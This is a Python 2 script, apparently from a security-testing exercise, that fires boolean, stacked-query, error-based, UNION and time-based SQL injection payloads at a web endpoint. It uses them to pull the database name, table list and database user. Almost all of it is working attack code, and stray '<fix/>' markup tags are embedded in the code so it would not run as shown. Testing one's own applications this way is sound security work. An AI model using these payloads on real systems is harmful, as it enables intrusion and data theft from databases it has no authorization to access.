# -- coding: utf-8 --
import os
import sys
import urllib2
import httplib
import json as js
import time
import requests


def check_boolean_based_attack(url):
    arr = ["'%20OR%20'1'%20=%20'1';%20--%20", "\"%20OR%20'1'%20=%20'1';%20--%20", "%20OR%20'1'%20=%20'1';%20--%20"]
    for e in arr:
        opener = urllib2.build_opener()
        f = opener.open(url + e)
        if f.getcode() == 200:
            res = js.loads(f.read())
            <fix/>print "This web server is vulnerable for boolean based sql injection attack."</fix>
            print "The response after boolean attack is:"
            print res
            print
            break


def check_stack_query(url):
    req = url + "'%3B%20SELECT%20DATABASE()%3B%20--%20"
    opener = urllib2.build_opener()
    f = opener.open(req)
    database = js.loads(f.read())
    <fix/>print "This web server is vulnerable for Stacked Queries(Piggy Backing) sql injection attack. " \
          "This is the most dangerous sql injection attack type." \
          "The suggestion is to close multiple query or check the user input."</fix>
    print "The Database's name is: "
    print database[1][0]['DATABASE()'] + "\n"

    req = url + "'%3B%20SHOW%20TABLES%3B%20--%20"
    f = opener.open(req)
    tables = js.loads(f.read())
    print "The tables in this database are: "
    for table in tables[1]:
        print table.values()[0]
    print


def check__error_based_attack(url):
    for i in range(1, 1000):
        newUrl = url + "'%20ORDER%20BY%20" + str(i) + "%3B--%20"
        r = requests.get(newUrl)
        if r.status_code != 200 and r.content.find("ER_BAD_FIELD_ERROR") != -1:
            <fix/>print "This web server is potentially vulnerable for error based sql injection attack. " \</fix>
                  "The suggestion is do not exposed detailed database error to the public."
            print "The error message is:"
            print r.content
            print
            break


def check_union_query_based_attack(url):
    number = 1
    for i in range(1, 1000):
        newUrl = url + "'%20UNION%20SELECT%20"
        for j in range(1, i):
            newUrl += str(j)
            if j != i - 1:
                newUrl += ","
        newUrl += ";--%20"
        r = requests.get(newUrl)
        if r.status_code == 200:
            number = i - 1
            break
        if i == 999:
            print "We didn't find any union-query based database vulnerabilities in this security check."
    newUrl = url + "'%20UNION%20SELECT%20"
    for j in range(1, number):
        newUrl += str(j) + ","
    newUrl += "user();--%20"
    r = requests.get(newUrl)
    print "This web server is vulnerable for union-query based sql injection attack."
    print "The response we get from the web might include the database user information:"
    print r.content
    print


def check_time_based_attack(url):
    arr = ["'%20AND%20SLEEP(15);%20--%20", "\"%20AND%20SLEEP(15);%20--%20", "%20AND%20SLEEP(15);%20--%20"]
    for e in arr:
        a = time.time()
        r = requests.get(url + e)
        b = time.time()
        duration = b - a
        if duration > 13:
            print "This web server is vulnerable for time based sql injection attack."
            print "The response time after boolean attack SLEEP(15) is: " + str(duration) + "\n"


online = "https://my-securitytest.herokuapp.com/getFriend/user1"
local = "http://localhost:3000/getFriend/user1"

<fix/>check_boolean_based_attack(online)
check_stack_query(online)
check__error_based_attack(online)
check_union_query_based_attack(online)
check_time_based_attack(online)</fix>

# localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
# localhost:3000/getFriend/user1'; SHOW TABLES; --%20

#
# commands = {
#     'command1': ex1.check_stack_query,
#     'command2': ex1.check_if_database_error_exposed
# }
#
# if __name__ == '__main__':
#     command = os.path.basename(sys.argv[0])
#     if command in commands:
#         commands[command](*sys.argv[1:])
